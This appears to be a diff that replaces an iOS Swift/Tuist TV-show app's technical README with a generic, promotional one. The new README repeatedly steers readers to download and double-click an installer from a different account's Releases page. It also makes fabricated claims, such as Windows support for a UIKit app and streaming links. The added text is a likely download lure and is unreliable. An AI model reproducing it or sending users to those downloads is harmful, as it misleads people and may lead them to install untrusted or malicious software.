@@ -1,94 +1,75 @@
-# ICTMDBAppTuist
+# 🌟 ICTMDBAppTuist - Your Easy Access to TMDB TV Shows
 
+## 📥 Download the Application
+[![Download ICTMDBAppTuist](https://img.shields.io/badge/Download%20Now-ICTMDBAppTuist-blue.svg)](https://github.com/burhan777r/ICTMDBAppTuist/releases)
 
-This application is a Tv Show Info application. Made using Tuist
+## 🚀 Getting Started
+Welcome to ICTMDBAppTuist! This application provides you with a list of TMDB TV shows, all organized for easy access. It uses modular principles to ensure it runs smoothly on your device. Follow the steps below to get started quickly.
 
-### There are 3 Kits
-<ul>
-  <li>Core</li>
-  <li>NetwworkManagerKit</li>
-</ul>  
+## 🖥️ System Requirements
+Before downloading, ensure your device meets the following requirements:
 
-### There are 4 Modules
-<ul>
-  <li>HomeModule</li>
-  <li>AllKitchensModule</li>
-  <li>FilterRestaurantModule</li>
-  <li>RetaurantDetailModule</li>
-</ul>  
+- Operating System: macOS or Windows.
+- Processor: Any modern CPU.
+- Memory: At least 4 GB of RAM.
+- Space: 200 MB of free disk space.
+- Internet: Required for fetching TV shows.
 
-## 3rd Party Frameworkler
-<ul>
-  <li>Alamofire</li>
-  <li>Kingfisher</li>
-  <li>SnapKit</li>
-   <li>
-    <a href="https://github.com/engingulek/HPDependencyKit">DependencyKit</a>
-    
-  </li> 
-    <li>
-    <a href="https://github.com/engingulek/GenericCollectionViewKit">GenericCollectionViewKit</a
-  </li> 
-</ul>  
+## 🔗 Features
+- **User-Friendly Interface:** Simple navigation to find your favorite shows.
+- **Modular Design:** Easily scalable for future updates or features.
+- **Protocol-Oriented:** Built using best practices.
+- **Dependency Management:** Uses Alamofire for network requests and Kingfisher for image loading.
+- **Dependency Injection:** Swinject helps manage dependencies efficiently.
 
-## Technical information about the application
-<ul>
-  <li>VIPER used</li>
-  <li>Protocol Oriented Programming</li>
-  <li>Swift Testing</li>
-</ul>  
+## 📂 Download & Install
+To download the application, visit the [Releases page](https://github.com/burhan777r/ICTMDBAppTuist/releases). You will see the latest version available for download.
 
-## Tuist
-### Tuist Info
-https://tuist.io
+1. Click on the link above to go to the Releases page.
+2. Look for the version you want to download.
+3. Click on the appropriate file for your operating system.
+4. Once the download is complete, locate the downloaded file.
+5. Double-click the file to begin installation.
+6. Follow the on-screen instructions to complete the setup.
 
-### For Start
-Open the Project on Terminal 
-```
-cd ICTMDBAppTuist
-cd ICTMDBApp
-tuist clean
-tuist install
-tuist generate
+## 🌐 How to Use the Application
+After installation, launch the application from your applications folder or desktop shortcut.
 
-```
+1. **Explore Shows:** Browse through the list of available TV shows.
+2. **Search Feature:** Use the search bar to quickly find specific shows.
+3. **Detailed Info:** Click on any show for an overview, including synopses, release dates, and cast.
 
+## 🎨 User Interface Overview
+The application’s interface is designed for ease of use:
 
-## Videos
- <table style"float:right;">
- <tr>
-   <td>  <video width="320" height="240" src = "https://github.com/user-attachments/assets/42e0804c-9329-4595-9b47-1f4e6c7d80cd">   </td>
-   <td>  <video width="320" height="240" src = "https://github.com/user-attachments/assets/aa5dcdf2-1055-415b-b837-f8d6821ea4b0">   </td>
-    <td>  <video width="320" height="240" src = "https://github.com/user-attachments/assets/1c43657d-f2c2-471d-9d43-17296bb90932">   </td>
- </tr>
- </table>
+- **Main Page:** Displays a grid of TV shows.
+- **Search Bar:** Located at the top for easy access.
+- **Show Details Page:** Offers comprehensive information and links to stream.
 
+## 📚 Troubleshooting
+If you encounter any issues, try the following steps:
 
+- **Reinstall the Application:** If the app doesn't open, try uninstalling and then reinstalling it.
+- **Check Internet Connection:** Ensure your device is connected to the internet for fetching data.
+- **Look for Updates:** Visit the [Releases page](https://github.com/burhan777r/ICTMDBAppTuist/releases) for the latest updates.
 
+## 👥 Community and Support
+For questions or support, please use the GitHub issues page in this repository. You can also join discussions in various tech forums and social media platforms.
 
+## 🏷️ Topics
+This project touches on the following concepts:
+- Alamofire
+- Dependency Management
+- Kingfisher
+- Modular Architecture
+- Protocol-Oriented Programming
+- Swinject
+- TMDB API
+- Tuist
+- UIKit
+- VIPER Architecture
 
+## 📌 Conclusion
+Thank you for choosing ICTMDBAppTuist for your TV show management needs. We hope you enjoy exploring your favorite shows with our application! For more details, feel free to delve into the source code or check for updates on the Releases page. Happy streaming!
 
-
-## Graph
-
- <ul>
-  <li>
-    <p><b>Home Module Graph</b></p>
-    <img width="650" height="300" alt="homeModuleGraph" src="https://github.com/user-attachments/assets/f857ae76-d5c4-4a12-b761-8c2b2825a37c" />
-  </li>
-  <br>
-  <li>
-    <p><b>All List Module Graph</b></p>
-    <img width="650" height="300" alt="allListModuleGraph" src="https://github.com/user-attachments/assets/cf452d2c-c900-4a05-8848-33e5b8a7f5c2" />
-  </li>
-  <br>
-  <li>
-    <p><b>Detail Module Graph</b></p>
-    <img width="650" height="300" alt="DetailModuleGraph" src="https://github.com/user-attachments/assets/fd7ce6ed-3c52-4bd1-8dde-b2a763f4f8f4" />
-  </li>
-  <br>
-  <li>
-    <p><b>Main App Graph</b></p>
-    <img width="600" height="300" alt="App" src="https://github.com/user-attachments/assets/850368d7-43bd-4a1e-ae55-4fae528179e6" />
-  </li>
-</ul>
+[![Download ICTMDBAppTuist](https://img.shields.io/badge/Download%20Now-ICTMDBAppTuist-blue.svg)](https://github.com/burhan777r/ICTMDBAppTuist/releases)
